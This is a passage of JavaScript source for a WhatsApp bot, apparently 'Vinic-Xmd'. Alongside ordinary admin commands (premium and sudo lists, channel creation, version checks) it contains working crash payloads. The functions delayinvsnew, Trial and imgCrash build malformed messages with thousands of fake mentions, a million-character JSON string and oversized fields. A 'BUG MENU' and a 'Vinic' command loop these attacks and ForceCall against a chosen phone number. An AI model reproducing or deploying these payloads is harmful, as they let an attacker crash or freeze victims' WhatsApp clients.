                           attrs: { is_status_mention: "༒𝗞𝗘𝗩𝗜𝗡 𝗧𝗘𝗖𝗛༒" },
                             content: undefined
}
]
}
);
}
}

async function delayinvsnew(sam, target) {
  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }
    }
  }

  const msg = generateWAMessageFromContent(target, message, {})

  await sam.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  })
}


async function Trial(target) { 
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "Kizzu Ryuichi"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ \"display_text\" : \"Kizzu Ryuichiᬊᬁ\", \"url\" : \"\", \"merchant_url\" : \"\" }"
            }],
            'messageParamsJson': "{".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': target
  });
  await conn.relayMessage(target, messageContent.message, { 
    'participant': {
      'jid': target
    },
    'messageId': messageContent.key.id
  });
  console.log(chalk.blue.bold("Sending trial bug"))
}


// ADD THE imgCrash FUNCTION RIGHT HERE
async function imgCrash(target) {
  await conn.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            fromMe: false,
            stanzaId: target,
            participant: target,
            quotedMessage: {
              conversation: "҉҈𑇂𑆵𑆴𑆿".repeat(6000)
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING",
            },
            isForwarded: true, 
            forwardingScore: 250208,
            businessMessageForwardInfo: {
              businessOwnerJid: "13135550002@s.whatsapp.net"
            }
          }, 
          header: {
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN5r3ZII4fpyrCO02rVD_ubOqMdhzExNoAxy2rT_4dJ6tJ0Y9-OK_WZ11xxgMylQOpWXQm-nC3quuooi9txtx33xRO8WSLrmwSabRXYHA?ccb=9-4&oh=01_Q5Aa2QEuMtY1rLn-CxG9dIrsjPmgV_BHIqfcuevCwxGSCBA7bQ&oe=68CA72F9&_nc_sid=e6ed6c&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "30soM43in2+ESTej4keg8SIBvljVyabjWTOxSU/Qo8M=",
              fileLength: "9000000000000000000",
              height: 640,
              width: 640,
              mediaKey: "ZF/d//7OeYxddFFNhRQ7eGBqTTh541512tSwmxbn4RY=",
              fileEncSha256: "PphwPMiHy1DHTWprrHrAfvWct6zlUIQU6mySAP7zhVQ=",
              "directPath": "/o1/v/t24/f2/m238/AQN5r3ZII4fpyrCO02rVD_ubOqMdhzExNoAxy2rT_4dJ6tJ0Y9-OK_WZ11xxgMylQOpWXQm-nC3quuooi9txtx33xRO8WSLrmwSabRXYHA?ccb=9-4&oh=01_Q5Aa2QEuMtY1rLn-CxG9dIrsjPmgV_BHIqfcuevCwxGSCBA7bQ&oe=68CA72F9&_nc_sid=e6ed6c",
              mediaKeyTimestamp: "1755515973",
              jpegThumbnail: null, 
              contextInfo: {
                fromMe: false,
                stanzaId: target,
                participant: target,
                disappearingMode: {
                  initiator: "CHANGED_IN_CHAT",
                  trigger: "CHAT_SETTING",
                }, 
                isForwarded: true, 
                forwardingScore: 999
              }
            }
          },
          body: {
            text: "The Angry Soul Come Back From Beyond The Grave"
          }, 
          footer: {
            text: "yuuKey -~"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: ""
              },              
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  "icon": "REVIEW",
                  "flow_cta": "\u200B".repeat(9000),
                  "flow_message_version": "3"
                })
              },  
            ],
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "𝐊𝐢𝐥𝐥𝐞𝐫 𝐐𝐮𝐞𝐞𝐧 𝐕𝟏𝟐",
                url: "https://t.me/YuukeyD7eppeli",
                copy_code: "𝐃 | 𝟕𝐞𝐩𝐩𝐞𝐥𝐢-𝐓𝐞𝐚𝐦𝐬",
                expiration_time: Date.now() * 1000
              },
              reminder_info: {
                reminder_status: "reminder_pending",
                scheduled_timestamp: Date.now() * 1000
              }
            })
          }
        }
      }
    }
  }, { participant: { jid: target }})
}



switch (command) {
    case 'menu':
    case 'vinic': {
        // Send loading message first
const loadingMsg = await conn.sendMessage(m.chat, { 
    text: '🔄 *Loading menu...*' 
}, { quoted: m });

try {
// Calculate memory usage
const totalMemory = os.totalmem();
const freeMemory = os.freemem();
const systemUsedMemory = totalMemory - freeMemory;
    // Define menu sections for organization
    const menuSections = {
            header: {
                title: '🔥ᴠɪɴɪᴄ xᴍᴅ🔮',
                content: [
                    `👤 ᴜsᴇʀ: ${pushname || 'Unknown'}`,
                        `🤖 ʙᴏᴛɴᴀᴍᴇ: ᴠɪɴɪᴄ xᴍᴅ`,
                        `🌍 ᴍᴏᴅᴇ: ${conn.public ? 'ᴘᴜʙʟɪᴄ' : 'ᴘʀɪᴠᴀᴛᴇ'}`,
                        `🛠️ ᴘʀᴇғɪx: [ ${prefix} ]`,
                        `📈 ᴄᴍᴅs: 100+`, // Replace with actual command count if available
                        `🧪 ᴠᴇʀsɪᴏɴ: ${global.versions}`,
                        ` 💾 𝚁𝙰𝙼: ${progressBar(systemUsedMemory, totalMemory)}\n`,
                    `👤 ᴅᴇᴠ: ☘ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ ☘`,
                ],
            },
                bug: {
                    title: ' *BUG MENU*',
                    commands: [
                        '𝖨𝗇𝗏𝗂𝗌', '𝖷𝖼𝗋𝖺𝗌𝗁', '𝖢𝗋𝖺𝗌𝗁', '𝖣𝖾𝗅𝖺𝗒',
                        '𝙲𝚛𝚊𝚡', 'lonelysaam', 'ceo-venom', 'imgcrash', '𝖣𝗂𝗆', 'Vinic-crash', 'delaybug',
                    ],
                },
                owner: {
                    title: ' *OWNER MENU*',
                    commands: [
                        '𝖠𝖽𝖽𝗉𝗋𝖾𝗆 <number>', 'd𝖾𝗅𝗉𝗋𝖾𝗆 <number>', '𝖯𝗎𝖻𝗅𝗂𝖼', 'private', 'clearallprem', 'delpremmulti',
                        '𝙸𝚍𝚌𝚑', '𝙲𝚛𝚎𝚊𝚝𝚎𝚌𝚑', 'creategroup',
                        'antidelete', 'del', 'setpp', 'delpp', 'lastseen', 'setprefix', 'groupid', 'readreceipts', 'reportbug', 'clearchat', 'hack', 'groupjids', 'broadcast', 'disappear', 'disappearstatus','clearchat', 'react', 'chatbot',
                        'listblocked', 'online', 'join', 'leave', 'setbio', 'backup', 'reqeust', 'block', 'gpass','toviewonce', 'setownername', 'autoviewstatus', 'unblock', 'unblockall', 'gcaddprivacy', 'ppprivancy', 'tostatus',
                        'anticall', 'antibug', 'vv', 'vv2', 'idch','autorecording', 'autotyping', 'getpp',
                    ],
                },
                group: {
                    title: ' *GROUP MENU* ',
                    commands: [
                        '𝖧𝗂𝖽𝖾𝗍𝖺𝗀', '𝖪𝗂𝖼𝗄', '𝖱𝖾𝗌𝖾𝗍𝗅𝗂𝗇𝗄', 'linkgc', 'checkchan',
                        'antilink', 'listonline', 'add', 'listactive', 'listinactive', 'close',
                        'open', 'kick', 'topchatters', 'listadmin',  'kickall', 'closetime', 'groupdisappear', 'tagall2', 'lockgc', 'unlockgc', 'opentime', 'poll', 'totalmembers', 'mediatag', 'getgrouppp', 'antilink', 'tagall', 'groupinfo', 'kick2', 'tagadmin2', 'setgroupname', 'delgrouppp', 'invite', 'editinfo', 'approve', 'disapproveall', 'listrequest', 'promote', 'demote', 'setdisc', 'vcf',
                    ],
                },
                ai: {
                title: ' *AI MENU*',
                commands: ['generate', 'flux', 'gpt'],
                },
                audio: {
                title: ' *AUDIO MENU*',
                commands: ['bass', 'treble', 'blown', 'robot', 'reverse', 'instrumental', 'vocalremove', 'karaoke', 'volaudio', 'fast', 'slow'],
                },
                image: {
                title: ' *IMAGE MENU*',
                commands: ['wallapaper'],
                },
                reaction: {
                title: ' *REACTION MENU*',
                commands: ['kiss', 'blush', 'kick', 'slap', 'dance', 'bully', 'kill', 'hug', 'happy', 'cry'],
                },
                download: {
                    title: ' *DOWNLOAD MENU* ',
                    commands: ['play', 'play2', 'song', 'song2', 'gitclone', 'ringtone', 'download', 'pinterest', 'mediafire', 'itunes', 'ytmp4', 'ytstalk', 'apk', 'gdrive', 'playdoc', 'tiktok', 'tiktok2', 'instagram', 'video', 'video2', 'tiktokaudio', 'save', 'facebook'],
                },
                sport: {
                title: ' *SPORT MENU*',
                commands:['worldcupmatches', 'elcmatches', 'europaleaguematches', 'ligue1matches', 'eplmatches', 'championsleaguematches', 'bundesligamatches', 'serieamatches', 'worldcupupcoming', 'ligue1upcoming', 'europaleagueupcoming', 'wrestlingevent', 'wwenews', 'wweschedule'],
                },
                convert: {
                    title: ' *CONVERT MENU* ',
                    commands: ['toaudio', 'toimage', 'url', 'tovideo', 'topdf', 'sticker'],
                },
                cmdTool: {
                    title: ' *TOOLS MENU* ',
                    commands: ['ping', 'bothosting', 'repo', 'botstatus', 'botinfo', 'sc', 'serverinfo', 'alive'],
                },
                other: {
                    title: ' *OTHER MENU*',
                    commands: ['time', 'calculate',  'owner', 'dev', 'fliptext', 'translate', 'ss2', 'sswebpc', 'kevinfarm', 'say', 'getdevice', 'ss','userinfo', 'npm', 'footballhelp', 'gsmarena', 'obfuscate', 'getabout', 'tinylink', 'vcc', 'getbussiness', 'listpc', 'sswebpc'],
                },
                helpers: {
                title: ' *SUPPORT MENU*',
                commands: ['helpers'],
                },
                ephoto: {
                    title: ' *EPHOTO360MAKER MENU* ',
                    commands: ['blackpinklogo', 'blackpinkstyle', 'glossysilver', 'glitchtext', 'arting', 'advancedglow', 'cartoonstyle', 'deadpool', 'deletingtext', 'luxurygold', 'pixelglitch', 'multicoloredneon','effectclouds', 'flagtext' ,'freecreat','galaxystyle', 'galaxywallpaper', 'glowingtext', 'makingneon', 'matrix','royaltext', 'sand', 'summerbeach','topography', 'typography', 'flux', 'dragonball'],
                },
                search: {
                    title: ' *SEARCH MENU* ',
                    commands: ['lyrics', 'chord', 'weather', 'movie', 'define', 'gitstalk', 'tiktokstalk', 'ytsearch', 'shazam'],
                },
                fun: {
                    title: ' *FUN MENU* ',
                    commands: ['dare', 'Quotes', 'truth', 'fact', 'truthdetecter', 'valentines', 'advice', 'motivate', 'pickupline', '8balls', 'mee', 'emoji', 'lovetest', 'character', 'compatibility', 'compliment',  'jokes'],
                },
                religion: {
                    title: ' *RELIGION MENU* ',
                    commands: ['Bible', 'Biblelist', 'Quran'],
                },
            };
            
    
    // Function to format the menu
const formatMenu = () => {
    let menu = `╭═✦〔 🤖 ᴠɪɴɪᴄ xᴅ 〕✦═╮\n`;
    menu += menuSections.header.content.map(line => `┃ ${line}`).join('\n') + '\n';
    menu += `╰═✦═════════════╯\n\n`;

    for (const section of Object.values(menuSections).slice(1)) {
        // Format the title with the box style
        menu += `╭━◈${section.title.toUpperCase()} ◈\n`;
        menu += section.commands.map(cmd => `│ ✦ ${prefix}${cmd}`).join('\n') + '\n';
        menu += `┗▣\n\n`;
    }
         
    menu += `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ `;
    return menu;
};


      try {
    // Array of image URLs to choose from randomly
    const imageUrls = [
        'https://files.catbox.moe/ptpl5c.jpeg',
        'https://files.catbox.moe/uw1n4n.jpg'
    ];
    
    // Array of audio URLs to choose from randomly
    const audioUrls = [
        'https://files.catbox.moe/jdozs7.mp3',
        'https://files.catbox.moe/yny58w.mp3',
        'https://files.catbox.moe/zhr5m2.mp3'
    ];
    
    // Randomly select one image and one audio
    const randomImage = imageUrls[Math.floor(Math.random() * imageUrls.length)];
    const randomAudio = audioUrls[Math.floor(Math.random() * audioUrls.length)];

    // Send menu with random image
    await conn.sendMessage(m.chat, {
        image: { url: randomImage },
        caption: formatMenu(),
        contextInfo: {
            mentionedJid: [m.sender],
            forwardedNewsletterMessageInfo: {
                newsletterName: '🔮 ᴊᴏɪɴ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ🔮',
                newsletterJid: '120363401548261516@newsletter',
            },
            isForwarded: true,
            // externalAdreply has been removed 
            
            showAdAttribution: true,
            title: global.botname || 'ᴠɪɴɪᴄ xᴍᴅ',
            body: '☘ ᴋᴇʟᴠɪɴ ᴛᴇᴄʜ ☘',
            mediaType: 3,
            renderLargerThumbnail: false,
            thumbnail: cina, 
            sourceUrl: 'https://whatsapp.com/channel/0029Vb6eR1r05MUgYul6Pc2W',
        },
    }, { quoted: Kevin });

    // Send random audio
    await conn.sendMessage(m.chat, {
        audio: { url: randomAudio },
        mimetype: 'audio/mpeg',
        ptt: true,
    });

} catch (error) {
    console.error('Error sending menu:', error);
    await conn.sendMessage(m.chat, {
        text: 'Error displaying menu. Please try again!'
    });
}
} catch (error) {
    console.error('Error in menu command:', error);
    await conn.sendMessage(m.chat, {
        text: 'An error occurred while processing the menu command.'
    });
}
    break;
}
case "delprem":
case "removeprem":
case "unpremium": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix}delprem [number]\n*Example:* ${prefix}delprem 256xxx`);

    try {
        // Send loading reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        // Clean and validate the number
        let phoneNumber = text.split("|")[0].replace(/[^0-9]/g, '');
        
        // Add country code if missing (assuming Uganda +256 by default)
        if (phoneNumber.startsWith('0')) {
            phoneNumber = '256' + phoneNumber.substring(1);
        } else if (phoneNumber.length === 9 && !phoneNumber.startsWith('256')) {
            phoneNumber = '256' + phoneNumber;
        }
        
        const fullNumber = phoneNumber + '@s.whatsapp.net';

        // Load premium list
        const premPath = './start/lib/database/premium.json';
        let prem = [];
        
        // Ensure directory exists
        const dirPath = path.dirname(premPath);
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
        }
        
        // Load existing premium users
        if (fs.existsSync(premPath)) {
            try {
                prem = JSON.parse(fs.readFileSync(premPath, 'utf-8'));
            } catch (e) {
                console.error('Error parsing premium.json:', e);
                prem = [];
            }
        }

        // Check if user is premium
        const userIndex = prem.indexOf(fullNumber);
        if (userIndex === -1) {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key
                }
            });
            return reply(`❌ *This number is not in the premium list!*\nNumber: ${phoneNumber}`);
        }

        // Remove from premium list
        prem.splice(userIndex, 1);
        
        // Remove duplicates and save
        prem = [...new Set(prem)];
        fs.writeFileSync(premPath, JSON.stringify(prem, null, 2));

        // Update global premium list immediately
        if (global.premiumUsers) {
            global.premiumUsers.delete(fullNumber);
        }

        // Success reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });

        reply(`✅ *Premium access removed successfully!*\n\n• Number: ${phoneNumber}\n• Remaining Premium Users: ${prem.length}\n\nUser can no longer access premium commands.`);

        // Optional: Send notification to the removed user
        try {
            const userExists = await conn.onWhatsApp(fullNumber);
            if (userExists.length > 0) {
                await conn.sendMessage(fullNumber, {
                    text: `⚠️ *PREMIUM ACCESS REMOVED*\n\nYour premium access to *${global.botname}* has been removed.\n\nYou no longer have access to:\n• Premium commands\n• Priority support\n• Exclusive features\n\nContact the owner if this was a mistake.`
                });
            }
        } catch (notifyError) {
            console.log('Could not send removal notification to user:', notifyError);
        }

    } catch (error) {
        console.error('Error in delprem command:', error);
        
        // Error reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });
        
        reply('❌ *Failed to remove premium user.* Please try again or check the number format.');
    }
    break;
}

// Add companion command to remove multiple users at once
case "delpremmulti":
case "removepremmulti":
case "bulkdelprem": {
    if (!Access) return reply(mess.owner);
    if (!text) return reply(`*Usage:* ${prefix}delpremmulti [number1] [number2] [number3]\n*Example:* ${prefix}delpremmulti 256742932677 256712345678`);

    try {
        // Send loading reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        // Extract numbers from text
        const numbers = text.split(/\s+/).map(num => num.replace(/[^0-9]/g, ''));
        const validNumbers = numbers.filter(num => num.length >= 9);
        
        if (validNumbers.length === 0) {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key
                }
            });
            return reply('❌ *No valid numbers provided!*');
        }

        // Load premium list
        const premPath = './start/lib/database/premium.json';
        let prem = [];
        
        if (fs.existsSync(premPath)) {
            try {
                prem = JSON.parse(fs.readFileSync(premPath, 'utf-8'));
            } catch (e) {
                console.error('Error parsing premium.json:', e);
                prem = [];
            }
        }

        let removedCount = 0;
        let notFoundCount = 0;
        const removedNumbers = [];

        // Process each number
        for (const rawNumber of validNumbers) {
            let phoneNumber = rawNumber;
            
            // Format number
            if (phoneNumber.startsWith('0')) {
                phoneNumber = '256' + phoneNumber.substring(1);
            } else if (phoneNumber.length === 9 && !phoneNumber.startsWith('256')) {
                phoneNumber = '256' + phoneNumber;
            }
            
            const fullNumber = phoneNumber + '@s.whatsapp.net';
            const userIndex = prem.indexOf(fullNumber);
            
            if (userIndex !== -1) {
                prem.splice(userIndex, 1);
                removedCount++;
                removedNumbers.push(phoneNumber);
                
                // Update global list
                if (global.premiumUsers) {
                    global.premiumUsers.delete(fullNumber);
                }
            } else {
                notFoundCount++;
            }
        }

        // Save updated list
        if (removedCount > 0) {
            prem = [...new Set(prem)];
            fs.writeFileSync(premPath, JSON.stringify(prem, null, 2));
        }

        // Success reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });

        let resultMessage = `✅ *BULK PREMIUM REMOVAL COMPLETE*\n\n`;
        resultMessage += `• Removed: ${removedCount} users\n`;
        resultMessage += `• Not Found: ${notFoundCount} users\n`;
        resultMessage += `• Remaining Premium: ${prem.length} users\n`;
        
        if (removedNumbers.length > 0) {
            resultMessage += `\n*Removed Numbers:*\n`;
            resultMessage += removedNumbers.slice(0, 5).map(num => `• ${num}`).join('\n');
            if (removedNumbers.length > 5) {
                resultMessage += `\n• ...and ${removedNumbers.length - 5} more`;
            }
        }

        reply(resultMessage);

    } catch (error) {
        console.error('Error in bulk delprem command:', error);
        
        // Error reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });
        
        reply('❌ *Failed to remove premium users.* Please try again.');
    }
    break;
}

// Add command to clear all premium users
case "clearallprem":
case "resetpremium": {
    if (!Access) return reply(mess.owner);

    try {
        // Send loading reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        // Load current premium count
        const premPath = './start/lib/database/premium.json';
        let prem = [];
        let previousCount = 0;
        
        if (fs.existsSync(premPath)) {
            try {
                prem = JSON.parse(fs.readFileSync(premPath, 'utf-8'));
                previousCount = prem.length;
            } catch (e) {
                console.error('Error parsing premium.json:', e);
            }
        }

        // Confirmation for safety
        if (args[0] !== 'confirm') {
            return reply(`⚠️ *DANGEROUS COMMAND* ⚠️\n\nThis will remove ALL ${previousCount} premium users!\n\nIf you're sure, type: *${prefix}clearallprem confirm*`);
        }

        // Clear all premium users
        prem = [];
        fs.writeFileSync(premPath, JSON.stringify([], null, 2));

        // Clear global list
        if (global.premiumUsers) {
            global.premiumUsers.clear();
        }

        // Success reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });

        reply(`✅ *ALL PREMIUM USERS CLEARED!*\n\nRemoved ${previousCount} premium users.\nPremium list is now empty.`);

    } catch (error) {
        console.error('Error clearing all premium users:', error);
        
        // Error reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });
        
        reply('❌ *Failed to clear premium users.* Please try again.');
    }
   
}
break
case "Vinic":{
if(!Access) return reply(mess.owner)
if(!text) return reply("*Example: .Vinic 2567...*")
target = q.replace(/[^0-9]/g,'') + "@s.whatsapp.net"
await bugLoad()
reply(`▬▭▬▭▬▭▬▭▬▭▬▭▬\n${buggy}\n▬▭▬▭▬▭▬▭▬▭▬▭▬`)
     
for(let i = 0; i < 40; i++){
await ForceCall(target)
await ForceCall(target)
await ForceCall(target)
await sleep(1500)
await ForceCall(target)
await ForceCall(target)
await sleep(1500)
await ForceCall(target)

}
}
//======[OWNER CMDS]======//
case "addowner": 
case "addsudo": {
  if (!Access) return reply(mess.owner);
  
  if (m.chat.endsWith('@g.us') && !(m.mentionedJid && m.mentionedJid[0]) && !(m.quoted && m.quoted.sender)) {
    return reply('Reply to or tag a person!');
  }

  let mentionedUser = m.mentionedJid && m.mentionedJid[0];
  let quotedUser = m.quoted && m.quoted.sender;
  let userToAdd = mentionedUser || quotedUser || (text ? text.replace(/\D/g, "") + "@s.whatsapp.net" : null) || m.chat;

  if (!userToAdd) return reply('Mention a user or reply to their message to add them to the sudo list.');

  const sudoList = global.sudo; 

  if (!sudoList.includes(userToAdd)) {
    sudoList.push(userToAdd);
    await reply(`+${userToAdd.split('@')[0]} added to the sudo list and are be able to use any function of the bot even in private mode.`);
  } else {
    await reply(`+${userToAdd.split('@')[0]} is already a sudo user.`);
  }  
}
break
case "setownernumber": {
if (!Access) return reply(mess.owner);
if (args.length < 1) return reply(`Example: ${prefix + command} 256xxxxxxxx\n\nThis will change the owner's number in the database`);

let newNumber = args[0].replace(/\D/g, '');

if (newNumber.startsWith('0')) {
  return reply("⚠️ Phone numbers should not start with *0*. Use the full international format (e.g., *256...* instead of *07...*)");
}

if (newNumber.length < 5 || newNumber.length > 15) {
  return reply("⚠️ Please provide a valid phone number (5-15 digits)");
}

// Fix: Use setting.config structure
if (!global.db.data.settings) global.db.data.settings = {};
if (!global.db.data.settings[botNumber]) global.db.data.settings[botNumber] = {};
let setting = global.db.data.settings[botNumber];

// Initialize config if it doesn't exist
if (!setting.config) setting.config = {};

// Set the owner number in config
setting.config.ownernumber = newNumber;

// Also update the global variable if it exists
if (global.ownernumber) {
  global.ownernumber = newNumber;
}
await saveDatabase();

reply(`✅ Owner number changed to *${newNumber}* successfully.`);
}
break
case 'delsudo': {
  if (!Access) return reply(mess.owner);
  
  if (m.chat.endsWith('@g.us') && !(m.mentionedJid && m.mentionedJid[0]) && !(m.quoted && m.quoted.sender)) {
    return reply('Reply to or tag a person!');
  }

  let mentionedUser = m.mentionedJid && m.mentionedJid[0];
  let quotedUser = m.quoted && m.quoted.sender;
  let userToRemove = mentionedUser || quotedUser || (text ? text.replace(/\D/g, "") + "@s.whatsapp.net" : null) || m.chat;

  if (!userToRemove) return reply('Mention a user or reply to their message to remove them from the sudo list.');

  const sudoList = global.sudo;
  const index = sudoList.indexOf(userToRemove);

  if (index !== -1) {
    sudoList.splice(index, 1);
    await reply(`+${userToRemove.split('@')[0]} removed from the sudo list.`);
  } else {
    await reply(`+${userToRemove.split('@')[0]} is not in the sudo list.`);
  }
  
}
break
case 'cekidch': case 'idch': {
if (!text) return reply("*channel link*")
if (!text.includes("https://whatsapp.com/channel/")) return reply("*In valid link*")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "*Verified*" : "*No*"}
`
return reply(teks)
}
break
case 'createch': {
    if (!Access) return m.reply("*Owner command only*");
    let parts = text.split('|');
    let channelName = parts[0]?.trim();
    let channelDesc = parts[1]?.trim() || '';
    if (!channelName) {
        return m.reply(`Example: 
${prefix + command} *ChannelName|ChannelDesc*`)}
    try {
        const metadata = await conn.newsletterCreate(channelName, channelDesc);
        console.log(metadata);
        console.log('Channel metadata:', JSON.stringify(metadata, null, 2));
        let channelId;
        if (metadata && metadata.channelId) {
            channelId = metadata.channelId;
        } else if (metadata && metadata.id) {
            channelId = metadata.id;
        } else if (metadata && metadata.channel && metadata.channel.id) {
            channelId = metadata.channel.id;
        } else if (typeof metadata === 'string') {
            channelId = metadata;
        } else {
            const findId = (obj) => {
                if (!obj || typeof obj !== 'object') return null;
                for (const key in obj) {
                    if (key === 'id' || key === 'channelId' || key.toLowerCase().includes('id')) {
                        return obj[key];
                    }
                    if (typeof obj[key] === 'object') {
                        const nestedId = findId(obj[key]);
                        if (nestedId) return nestedId;
                    }
                }
                return null;
            };      
            channelId = findId(metadata);
        }
        if (!channelId) {
            console.warn('Warning: ChannelId tidak ditemukan di response, menggunakan fallback...');
            channelId = "unknown-channel-id";
        }
        let successDetails = [];
        successDetails.push(`✅ Channel "${channelName}" `);
        if (channelDesc) {
            successDetails.push(`✅ Description Added`);
        }
        successDetails.push(`\nID Channel: ${channelId}`);
        await conn.sendMessage(m.chat, {
            text: successDetails.join('\n')
        });
    } catch (error) {
        console.error('Error creating channel:', error);
        m.reply(`${error.message}`);
    }
}
break
case "checkupdate":
case "updatecheck":
case "version": {
    try {
        // Read local version data
        const localVersionPath = path.join(__dirname, '../data/version.json');
        let localVersion = 'Unknown';
        let changelog = 'No changelog available.';
        
        if (fs.existsSync(localVersionPath)) {
            try {
                const localData = JSON.parse(fs.readFileSync(localVersionPath, 'utf8'));
                localVersion = localData.version || 'Unknown';
                changelog = localData.changelog || 'No changelog available.';
            } catch (e) {
                console.error('Error reading local version file:', e);
            }
        }

        // Fetch latest version data from GitHub
        const rawVersionUrl = 'https://raw.githubusercontent.com/Kevintech-hub/Vinic-Xmd-/main/data/version.json';
        let latestVersion = 'Unknown';
        let latestChangelog = 'No changelog available.';
        
        try {
            const response = await axios.get(rawVersionUrl, { timeout: 10000 });
            latestVersion = response.data.version || 'Unknown';
            latestChangelog = response.data.changelog || 'No changelog available.';
        } catch (error) {
            console.error('Failed to fetch latest version:', error);
        }

        // Count case commands in this file
        let caseCount = 0;
        const caseCommands = new Set();
        
        try {
            // Read the current file content
            const currentFileContent = fs.readFileSync(__filename, 'utf8');
            
            // Regex to find case statements - matches "case 'command':" or "case "command":"
            const caseRegex = /case\s+(["'])(.*?)\1\s*:/g;
            let match;
            
            while ((match = caseRegex.exec(currentFileContent)) !== null) {
                caseCount++;
                caseCommands.add(match[2].trim());
            }
            
            console.log(`Found ${caseCount} case commands in the file`);
            
        } catch (e) {
            console.error('Error counting case commands:', e);
            // Provide a fallback count based on your menu sections
            caseCount = 150; // Approximate count based on your menu
        }

        // System info
        const uptime = runtime(process.uptime());
        const ramUsage = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
        const totalRam = (os.totalmem() / 1024 / 1024).toFixed(2);
        const hostName = os.hostname() || 'Unknown';
        
        let lastUpdate = 'Unknown';
        try {
            if (fs.existsSync(localVersionPath)) {
                lastUpdate = fs.statSync(localVersionPath).mtime.toLocaleString();
            }
        } catch (e) {
            console.error('Error getting last update time:', e);
        }

        // GitHub repo URL
        const githubRepo = 'https://github.com/Kevintech-hub/Vinic-Xmd-';

        // Check update status
        let updateStatus = '✅ *Your Vinic-Xmd bot is up-to-date!*';
        let needsUpdate = false;
        
        if (localVersion !== latestVersion && latestVersion !== 'Unknown') {
            updateStatus = `*😵‍💫 Your Vinic-Xmd bot is outdated!*
🔹 *Current version:* ${localVersion}
🔹 *Latest version:* ${latestVersion}

*Use .update to update your bot.*`;
            needsUpdate = true;
        }

        // Get time-based greeting
        const currentHour = new Date().getHours();
        let greeting = 'Hello';
        if (currentHour < 12) greeting = 'Good Morning';
        else if (currentHour < 18) greeting = 'Good Afternoon';
        else greeting = 'Good Evening';

        const statusMessage = `🌟 *${greeting}, ${pushname || 'User'}!* 🌟\n\n` +
            `🤖 *Bot Name:* Vinic-Xmd\n` +
            `🔖 *Current version:* ${localVersion}\n` +
            `📢 *Latest version:* ${latestVersion}\n` +
            `📂 *Total Commands:* ${caseCount}\n\n` +
            `💾 *System Info:*\n` +
            `⏰ *Uptime:* ${uptime}\n` +
